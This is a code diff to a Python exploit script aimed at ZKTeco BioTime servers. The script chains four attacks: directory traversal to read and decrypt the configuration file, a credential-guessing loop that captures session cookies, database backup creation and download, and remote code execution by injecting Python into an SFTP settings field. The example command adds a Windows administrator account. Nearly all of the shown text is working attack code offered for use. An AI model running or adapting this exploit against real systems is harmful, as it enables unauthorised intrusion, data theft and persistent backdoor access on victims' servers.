@@ -38,6 +38,18 @@ proxies = {
 }
 proxies = {}
 
+if len(sys.argv) < 2:
+    print(f"Usage: python3 {sys.argv[0]} http://vuln.site.com:88")
+    sys.exit(1)
+
+print( "__________.__     ___________.__                ")
+print( "\______   \__| ___\__    ___/|__| _____   ____  ")
+print( " |    |  _/  |/  _ \|    |   |  |/     \_/ __ \ ")
+print( " |    |   \  (  <_> )    |   |  |  Y Y  \  ___/ ")
+print( " |______  /__|\____/|____|   |__|__|_|  /\___  >")
+print( "        \/                            \/     \/ ")
+print( "                    @w3bd3vil - Krash Consulting")
+
 target =  sys.argv[1]
 
 
@@ -131,7 +143,7 @@ try:
             attConfig = base64.b64decode(response.text).decode('utf-8')
             #print(f"Output of BioTime config file: {attConfig}")
         except:
-            print("Couldn't get BioTime config file (possibly non default configuration)")
+            print("[-] Couldn't get BioTime config file (possibly non default configuration)")
     lines = attConfig.split('\n')
 
     for i, line in enumerate(lines):
@@ -139,10 +151,9 @@ try:
             dec_att = decrypt_rc4(lines[i].split("@!@=")[1])
             lines[i] = lines[i].split("@!@=")[0]+dec_att
     attConfig_modified = '\n'.join(lines)
-    print(f"Output of BioTime Decrypted config file:\n{attConfig_modified}")
+    print(f"[+] Output of BioTime Decrypted config file:\n{attConfig_modified}")
 except:
-    print("Couldn't exploit Dir Traversal")
-
+    print("[-] Couldn't exploit Dir Traversal")
 
 # Extract Cookies
 url = f'{target}/login/'
@@ -195,7 +206,7 @@ for i in range(1,10):
         json_response = response.json()
         ret_value = json_response.get('ret')
         if ret_value == 0:
-            print(f"Valid Credentials found: Username is {username} and password is {password}")
+            print(f"[+] Valid Credentials found: Username is {username} and password is {password}")
             session_id_cookie = response.cookies.get('sessionid')
             if session_id_cookie:
                 print(f"Auth Session ID: {session_id_cookie}")
@@ -206,7 +217,7 @@ for i in range(1,10):
             break
 
 if i == 9:
-    print("No valid users found!")
+    print("[-] No valid users found!")
     sys.exit(1)
 
 # Check for Backups
@@ -254,9 +265,9 @@ def downloadBackup():
             filename = os.path.basename(url)
             with open(filename, 'wb') as file:
                 file.write(response.content)
-            print(f"File '{filename}' downloaded successfully.")
+            print(f"[+] Database dump file '{filename}', downloaded successfully.")
         else:
-            print("Failed to download the file. Status code:", response.status_code)
+            print("[-] Failed to download the database dump file. Status code:", response.status_code)
         return False
     else:
         print("No backup Found!")
@@ -264,6 +275,7 @@ def downloadBackup():
 
 def createBackup(targetPath=None):
     print("Attempting to create backup.")
+
     url = f'{target}/base/dbbackuplog/action/?action_name=44424261636b75704d616e75616c6c79&_popup=true&id='
     cookies = {
         'sessionid': session_id_cookie,
@@ -349,11 +361,15 @@ def sftpRCE():
     print("Attempting RCE!")
     #Add SFTP, Need valid IP/credentials here!
     print("Adding FTP List")
-
+    print("[~] To exploit this file overwrite, a valid SSH credential is required where")
+    print("\tthe vulnerable machine will connect back to")
     url = f'{target}/base/sftpsetting/add/'
-    myIpaddr = '192.168.0.11'
-    myUser = 'test'
-    myPassword = 'test@123'
+    # Prompt the user for inputs, with default values
+    myIpaddr = input("Enter IP address (ex: 192.168.0.11): ") 
+    myUser = input("Enter username (ex: test): ")
+    myPassword = input("Enter password (ex: test@123): ")
+
+
 
     cookies = {
         'sessionid': session_id_cookie,
@@ -406,6 +422,9 @@ def sftpRCE():
         'sessionid': session_id_cookie,
         'csrftoken': csrf_token_value
     }
+    print("Enter the command to execute")
+    print("net user /add omair190 KCP@ssw0rd && net localgroup administrators")
+    commandExecute = input(" ")
     data = {
         'csrfmiddlewaretoken': csrf_token_value,
         'host':myIpaddr,
@@ -413,11 +432,12 @@ def sftpRCE():
         'is_sftp': 1,
         'user_name': dirTraverse,
         'user_password':myPassword,
-        'user_key':'import os\nos.system("net user /add omair190 KCP@ssw0rd && net localgroup administrators ...',
+        'user_key':'import os\nos.system("{commandExecute}")',
         'obj_id': getID
     }
+    print(data)
     response = requests.post(url,  cookies=cookies, data=data, proxies=proxies, verify=False)
-    print("A new user should be added now on the server \nusername: omair190\npassword: KCP@ssw0rd")
+    print("[+] Command should be executed now!")
 
     #Delete SFTP
     print("Deleting SFTP Settings")
